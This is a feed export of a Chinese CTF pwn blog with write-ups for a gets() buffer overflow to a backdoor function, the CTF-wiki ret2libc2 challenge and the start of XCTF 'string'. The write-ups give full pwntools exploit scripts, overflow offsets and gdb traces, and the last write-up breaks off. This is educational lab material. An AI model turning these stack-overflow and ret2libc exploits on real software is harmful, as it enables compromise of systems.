        <content type="html"><![CDATA[<h2 id="1：我自己写的一个简单程序"><a href="#1：我自己写的一个简单程序" class="headerlink" title="1：我自己写的一个简单程序"></a>1：我自己写的一个简单程序</h2><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;unistd.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdlib.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">50</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">puts</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat test.py"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>溢出漏洞显而易见</p><h2 id="2：checksec"><a href="#2：checksec" class="headerlink" title="2：checksec"></a>2：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/buu-pwn$ checksec <span class="token function">test</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/buu-pwn/test'</span>    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>64位常规操作</p><h2 id="3：IDA"><a href="#3：IDA" class="headerlink" title="3：IDA"></a>3：IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-40h]</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"what"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span>有个backdoor函数<span class="token keyword">int</span> <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"cat test.py"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="4：gdb溢出点72"><a href="#4：gdb溢出点72" class="headerlink" title="4：gdb溢出点72"></a>4：gdb溢出点72</h2><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x4005a3 <span class="token operator">&lt;</span>main+44<span class="token operator">></span>:    call   0x400460 <span class="token operator">&lt;</span>puts@plt<span class="token operator">></span>   0x4005a8 <span class="token operator">&lt;</span>main+49<span class="token operator">></span>:    mov    eax,0x0   0x4005ad <span class="token operator">&lt;</span>main+54<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x4005ae <span class="token operator">&lt;</span>main+55<span class="token operator">></span>:    ret       0x4005af <span class="token operator">&lt;</span>backdoor<span class="token operator">></span>:    push   rbp   0x4005b0 <span class="token operator">&lt;</span>backdoor+1<span class="token operator">></span>:    mov    rbp,rsp   0x4005b3 <span class="token operator">&lt;</span>backdoor+4<span class="token operator">></span>:    lea    rdi,<span class="token punctuation">[</span>rip+0x9f<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 0x400659</span>   0x4005ba <span class="token operator">&lt;</span>backdoor+11<span class="token operator">></span>:    call   0x400470 <span class="token operator">&lt;</span>system@plt<span class="token operator">></span><span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0x7fffffffde88 <span class="token punctuation">(</span><span class="token string">"IAAeAA4AAJAAfAA5AAKAAgAA6AAL"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0x7fffffffde90 <span class="token punctuation">(</span><span class="token string">"AJAAfAA5AAKAAgAA6AAL"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0x7fffffffde98 <span class="token punctuation">(</span><span class="token string">"AAKAAgAA6AAL"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0x7fffffffdea0 --<span class="token operator">></span> 0x4c414136 <span class="token punctuation">(</span><span class="token string">'6AAL'</span><span class="token punctuation">)</span>0032<span class="token operator">|</span> 0x7fffffffdea8 --<span class="token operator">></span> 0x400577 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main<span class="token operator">></span>:    push   rbp<span class="token punctuation">)</span>0040<span class="token operator">|</span> 0x7fffffffdeb0 --<span class="token operator">></span> 0x0 0048<span class="token operator">|</span> 0x7fffffffdeb8 --<span class="token operator">></span> 0xb7de885b3d5ed61a 0056<span class="token operator">|</span> 0x7fffffffdec0 --<span class="token operator">></span> 0x400490 <span class="token punctuation">(</span><span class="token operator">&lt;</span>_start<span class="token operator">></span>:    xor    ebp,ebp<span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value0x00000000004005ae <span class="token keyword">in</span> main <span class="token punctuation">(</span><span class="token punctuation">)</span>gdb-peda$ pattern offset AAdAA3AAdAA3 found at offset: 64gdb-peda$ pattern offset IAAeAIAAeA found at offset: 72gdb-peda$ </code></pre><p>感觉没啥问题</p><h2 id="5：exp"><a href="#5：exp" class="headerlink" title="5：exp"></a>5：exp</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#使程序跳转到backdoor函数即可</span>payload <span class="token operator">=</span> <span class="token string">'A'</span><span class="token operator">*</span><span class="token number">72</span> <span class="token operator">+</span>   p64<span class="token punctuation">(</span><span class="token number">0x04005af</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="6：执行情况（gdb调试）"><a href="#6：执行情况（gdb调试）" class="headerlink" title="6：执行情况（gdb调试）"></a>6：执行情况（gdb调试）</h2><pre class=" language-bash"><code class="language-bash">RDI: 0x2 RBP: 0x7fffffffdd88 --<span class="token operator">></span> 0x0 RSP: 0x7fffffffdd28 --<span class="token operator">></span> 0x0 RIP: 0x7ffff7a332f6 <span class="token punctuation">(</span><span class="token operator">&lt;</span>do_system+1094<span class="token operator">></span>:    movaps XMMWORD PTR <span class="token punctuation">[</span>rsp+0x40<span class="token punctuation">]</span>,xmm0<span class="token punctuation">)</span>R8 <span class="token keyword">:</span> 0x7ffff7dd1600 --<span class="token operator">></span> 0x0 R9 <span class="token keyword">:</span> 0x0 R10: 0x8 R11: 0x246 R12: 0x400659 <span class="token punctuation">(</span><span class="token string">"cat test.py"</span><span class="token punctuation">)</span>R13: 0x7fffffffdfa0 --<span class="token operator">></span> 0x1 R14: 0x0 R15: 0x0EFLAGS: 0x10246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x7ffff7a332e6 <span class="token operator">&lt;</span>do_system+1078<span class="token operator">></span>:    movq   xmm0,QWORD PTR <span class="token punctuation">[</span>rsp+0x8<span class="token punctuation">]</span>   0x7ffff7a332ec <span class="token operator">&lt;</span>do_system+1084<span class="token operator">></span>:    mov    QWORD PTR <span class="token punctuation">[</span>rsp+0x8<span class="token punctuation">]</span>,rax   0x7ffff7a332f1 <span class="token operator">&lt;</span>do_system+1089<span class="token operator">></span>:    movhps xmm0,QWORD PTR <span class="token punctuation">[</span>rsp+0x8<span class="token punctuation">]</span><span class="token operator">=</span><span class="token operator">></span> 0x7ffff7a332f6 <span class="token operator">&lt;</span>do_system+1094<span class="token operator">></span>:    movaps XMMWORD PTR <span class="token punctuation">[</span>rsp+0x40<span class="token punctuation">]</span>,xmm0     <span class="token comment" spellcheck="true">#程序到这里死活不能动</span>   0x7ffff7a332fb <span class="token operator">&lt;</span>do_system+1099<span class="token operator">></span>:    call   0x7ffff7a23110 <span class="token operator">&lt;</span>__GI___sigaction<span class="token operator">></span>   0x7ffff7a33300 <span class="token operator">&lt;</span>do_system+1104<span class="token operator">></span>:    lea    rsi,<span class="token punctuation">[</span>rip+0x39e2f9<span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># 0x7ffff7dd1600 &lt;quit></span>   0x7ffff7a33307 <span class="token operator">&lt;</span>do_system+1111<span class="token operator">></span>:    xor    edx,edx   0x7ffff7a33309 <span class="token operator">&lt;</span>do_system+1113<span class="token operator">></span>:    mov    edi,0x3<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0x7fffffffdd28 --<span class="token operator">></span> 0x0 0008<span class="token operator">|</span> 0x7fffffffdd30 --<span class="token operator">></span> 0x7ffff7b97e97 --<span class="token operator">></span> 0x2f6e69622f00632d <span class="token punctuation">(</span><span class="token string">'-c'</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0x7fffffffdd38 --<span class="token operator">></span> 0x0 0024<span class="token operator">|</span> 0x7fffffffdd40 --<span class="token operator">></span> 0x1 0032<span class="token operator">|</span> 0x7fffffffdd48 --<span class="token operator">></span> 0x7ffff7a33360 <span class="token punctuation">(</span><span class="token operator">&lt;</span>cancel_handler<span class="token operator">></span>:    push   rbx<span class="token punctuation">)</span>0040<span class="token operator">|</span> 0x7fffffffdd50 --<span class="token operator">></span> 0x7fffffffdd44 --<span class="token operator">></span> 0xf7a3336000000000 0048<span class="token operator">|</span> 0x7fffffffdd58 --<span class="token operator">></span> 0x0 0056<span class="token operator">|</span> 0x7fffffffdd60 --<span class="token operator">></span> 0x0 <span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, valueStopped reason: SIGSEGV0x00007ffff7a332f6 <span class="token keyword">in</span> do_system <span class="token punctuation">(</span>line<span class="token operator">=</span>0x400659 <span class="token string">"cat test.py"</span><span class="token punctuation">)</span> at <span class="token punctuation">..</span>/sysdeps/posix/system.c:125125    <span class="token punctuation">..</span>/sysdeps/posix/system.c: 没有那个文件或目录.gdb-peda$ </code></pre><h2 id="7：原因"><a href="#7：原因" class="headerlink" title="7：原因"></a>7：原因</h2><p><strong>向大佬求助得知，奈何涉及堆栈平衡，适时吾甚愚昧不知所云，只可将0x7ffff7a332f6 &lt;do_system+1094&gt;:    movaps XMMWORD PTR [rsp+0x40],xmm0指令铭记于心，付以esp寄存器需需结尾为0</strong><br><strong>若想根治则反复使用pop  ， ret指令平衡参数或跳转。以及自制代码buf莫要随意限其大小，常见128，512甚好（8的整数倍）</strong></p><h3 id="修改利用ret指令"><a href="#修改利用ret指令" class="headerlink" title="修改利用ret指令"></a>修改利用ret指令</h3><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>DEBUG<span class="token punctuation">]</span> Received 0xd3 bytes:    <span class="token string">'from pwn import*\n'</span>    <span class="token string">"context.log_level = 'debug'\n"</span>    <span class="token string">'\n'</span>    <span class="token string">"sh = process('./test')\n"</span>    <span class="token string">'sh.recv()\n'</span>    <span class="token string">'#0x000000000040044e : ret\n'</span>    <span class="token string">"payload = 'A'*72 + p64(0x040044e) +  p64(0x04005af)\n"</span>    <span class="token string">'gdb.attach(sh)\n'</span>    <span class="token string">'sh.sendline(payload)\n'</span>    <span class="token string">'\n'</span>    <span class="token string">'sh.interactive()\n'</span>from pwn import*context.log_level <span class="token operator">=</span> <span class="token string">'debug'</span>sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./test'</span><span class="token punctuation">)</span>sh.recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#0x000000000040044e : ret</span>payload <span class="token operator">=</span> <span class="token string">'A'</span>*72 + p64<span class="token punctuation">(</span>0x040044e<span class="token punctuation">)</span> +  p64<span class="token punctuation">(</span>0x04005af<span class="token punctuation">)</span>gdb.attach<span class="token punctuation">(</span>sh<span class="token punctuation">)</span>sh.sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh.interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>*<span class="token punctuation">]</span> Got EOF <span class="token keyword">while</span> reading <span class="token keyword">in</span> interactive$  </code></pre><p><strong>所以以后能跳转到system函数时出错看看是不是这个原因</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 原理学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>wiki-ret2libc2</title>
      <link href="/2020/07/06/wiki-ret2libc2/"/>
      <url>/2020/07/06/wiki-ret2libc2/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/wiki/overflow$ checksec ret2libc2<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/wiki/overflow/ret2libc2'</span>    Arch:     i386-32-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x8048000<span class="token punctuation">)</span></code></pre><p>又是只有NX开启的常规操作</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><pre class=" language-c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [esp+1Ch] [ebp-64h]</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">setvbuf</span><span class="token punctuation">(</span>_bss_start<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Something surprise here, but I don't think it will work."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What do you think ?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p><strong>显然gets这里有栈溢出，用IDA检查字符串发现有system函数，但是没有/bin/sh字符串</strong></p><h2 id="3：gdb调试测其溢出点"><a href="#3：gdb调试测其溢出点" class="headerlink" title="3：gdb调试测其溢出点"></a>3：gdb调试测其溢出点</h2><pre class=" language-bash"><code class="language-bash"><span class="token punctuation">[</span>----------------------------------registers-----------------------------------<span class="token punctuation">]</span>EAX: 0x0 EBX: 0x0 ECX: 0xf7fb25c0 --<span class="token operator">></span> 0xfbad2288 EDX: 0xf7fb389c --<span class="token operator">></span> 0x0 ESI: 0xf7fb2000 --<span class="token operator">></span> 0x1d4d6c EDI: 0x0 EBP: 0x6941414d <span class="token punctuation">(</span><span class="token string">'MAAi'</span><span class="token punctuation">)</span>ESP: 0xffffd03c <span class="token punctuation">(</span><span class="token string">"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>EIP: 0x80486c5 <span class="token punctuation">(</span><span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret<span class="token punctuation">)</span>EFLAGS: 0x246 <span class="token punctuation">(</span>carry PARITY adjust ZERO sign <span class="token function">trap</span> INTERRUPT direction overflow<span class="token punctuation">)</span><span class="token punctuation">[</span>-------------------------------------code-------------------------------------<span class="token punctuation">]</span>   0x80486ba <span class="token operator">&lt;</span>main+114<span class="token operator">></span>:    call   0x8048460 <span class="token operator">&lt;</span>gets@plt<span class="token operator">></span>   0x80486bf <span class="token operator">&lt;</span>main+119<span class="token operator">></span>:    mov    eax,0x0   0x80486c4 <span class="token operator">&lt;</span>main+124<span class="token operator">></span>:    leave  <span class="token operator">=</span><span class="token operator">></span> 0x80486c5 <span class="token operator">&lt;</span>main+125<span class="token operator">></span>:    ret       0x80486c6:    xchg   ax,ax   0x80486c8:    xchg   ax,ax   0x80486ca:    xchg   ax,ax   0x80486cc:    xchg   ax,ax<span class="token punctuation">[</span>------------------------------------stack-------------------------------------<span class="token punctuation">]</span>0000<span class="token operator">|</span> 0xffffd03c <span class="token punctuation">(</span><span class="token string">"AA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0004<span class="token operator">|</span> 0xffffd040 <span class="token punctuation">(</span><span class="token string">"ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0008<span class="token operator">|</span> 0xffffd044 <span class="token punctuation">(</span><span class="token string">"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0012<span class="token operator">|</span> 0xffffd048 <span class="token punctuation">(</span><span class="token string">"AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0016<span class="token operator">|</span> 0xffffd04c <span class="token punctuation">(</span><span class="token string">"AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0020<span class="token operator">|</span> 0xffffd050 <span class="token punctuation">(</span><span class="token string">"PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0024<span class="token operator">|</span> 0xffffd054 <span class="token punctuation">(</span><span class="token string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span>0028<span class="token operator">|</span> 0xffffd058 <span class="token punctuation">(</span><span class="token string">"AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span><span class="token punctuation">)</span><span class="token punctuation">[</span>------------------------------------------------------------------------------<span class="token punctuation">]</span>Legend: code, data, rodata, value0x080486c5    30    <span class="token keyword">in</span> ret2libc.cgdb-peda$ pattern offset AA8AAA8A found at offset: 112gdb-peda$ </code></pre><p>溢出点为112</p><h2 id="4：思路"><a href="#4：思路" class="headerlink" title="4：思路"></a>4：思路</h2><p><strong>首先因为在程序中可以直接利用system函数，还有栈溢出跳转到system函数，接下来就是想办法得到/bin/sh字符串。</strong><br><strong>一般的如果题目没有给libc文件不老要想着找到libc地址来解题。那么不考虑libc文件中的/bin/sh字符串，我们看能不能利用输入来获得该字符串。</strong><br><strong>仔细看IDA主函数的伪代码会发现有个函数将bss段清零了（当然bss一般本来就是0）这应该就是给我们提示了，利用bss段全局变量来存放我们输入的/bin/sh，这样就可以让system函数利用这个字符串。那么输入函数这里直接有gets函数。ok构造exp</strong></p><h2 id="5：exp"><a href="#5：exp" class="headerlink" title="5：exp"></a>5：exp</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'ret2libc2'</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>gets_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'gets'</span><span class="token punctuation">]</span>bss_addr <span class="token operator">=</span> <span class="token number">0x0804A040</span>   <span class="token comment" spellcheck="true">#bss段的地址都可以在IDA找到</span>main <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span> sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./ret2libc2'</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"A"</span><span class="token operator">*</span><span class="token number">112</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>gets_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#gdb.attach(sh)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h3 id="易错点"><a href="#易错点" class="headerlink" title="易错点"></a>易错点</h3><p>之前我一直认为这个payload=payload = “A”<em>112 + p32(gets_plt) + p32(system_addr) + p32(bss_addr) + p32(system_ret) + p32(bss_addr)是完全没问题的，system_ret即将作为system函数的返回地址。<br>我这么认为是因为，我以为用p32(gets_plt）执行后p32(system_addr)作为返回地址，p32(bss_addr)作为参数：程序将跳转到system函数，<del>而p32(bss_addr)将被gets函数从栈中取出</del><br>**</em>后面这个想法大错特错，用gdb调试发现返回地址，和参数一直都在栈中，只是利用参数时会进行值的传递，而不是取出。**<br><img src="https://s1.ax1x.com/2020/07/06/UCWhEq.png" alt="函数调用过程"></p>]]></content>
      
      
      <categories>
          
          <category> CTF-PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wiki--pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XCTF-string</title>
      <link href="/2020/07/04/xctf-string/"/>
      <url>/2020/07/04/xctf-string/</url>
      
        <content type="html"><![CDATA[<h2 id="1：checksec"><a href="#1：checksec" class="headerlink" title="1：checksec"></a>1：checksec</h2><pre class=" language-bash"><code class="language-bash">hunter@hunter:~/PWN/XCTF/xctf_easy$ checksec string<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/hunter/PWN/XCTF/xctf_easy/string'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE <span class="token punctuation">(</span>0x400000<span class="token punctuation">)</span></code></pre><p>保护全开有点狠，但是不用慌，这应该告诉我们栈溢出控制程序是不可能的了</p><h2 id="2：IDA"><a href="#2：IDA" class="headerlink" title="2：IDA"></a>2：IDA</h2><p>程序比较大，下面是进行拆分排序后的函数组合</p><pre class=" language-c"><code class="language-c">main：__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span><span class="token punctuation">{</span>  _DWORD <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rax</span>  __int64 v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// ST18_8</span>  <span class="token function">setbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">alarm</span><span class="token punctuation">(</span><span class="token number">60u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_400996</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                 <span class="token comment" spellcheck="true">// 菜单输出，不用在意</span>  v3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                            <span class="token comment" spellcheck="true">// 开辟内存空间</span>  v4 <span class="token operator">=</span> <span class="token punctuation">(</span>__int64<span class="token punctuation">)</span>v3<span class="token punctuation">;</span>  <span class="token operator">*</span>v3 <span class="token operator">=</span> <span class="token number">68</span><span class="token punctuation">;</span>  v3<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">85</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"we are wizard, we will give you hand, you can not defeat dragon by yourself ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"we will tell you two secret ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"secret[0] is %x\n"</span><span class="token punctuation">,</span> v4<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment" spellcheck="true">// 将输出第一个和第二个元素的地址</span>                                                <span class="token comment" spellcheck="true">// </span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"secret[1] is %x\n"</span><span class="token punctuation">,</span> v4 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"do not tell anyone "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_400D72</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>                               <span class="token comment" spellcheck="true">// 将开辟内存空间传入该函数</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"The End.....Really?"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">}</span>sub_400D72函数：<span class="token comment" spellcheck="true">// a1是前面开辟内存空间的地址</span><span class="token keyword">unsigned</span> __int64 __fastcall <span class="token function">sub_400D72</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">char</span> s<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+10h] [rbp-20h]</span>  <span class="token keyword">unsigned</span> __int64 v3<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+28h] [rbp-8h]</span>  v3 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">40u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"What should your character's name be:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">_isoc99_scanf</span><span class="token punctuation">(</span><span class="token punctuation">(</span>__int64<span class="token punctuation">)</span><span class="token string">"%s"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>__int64<span 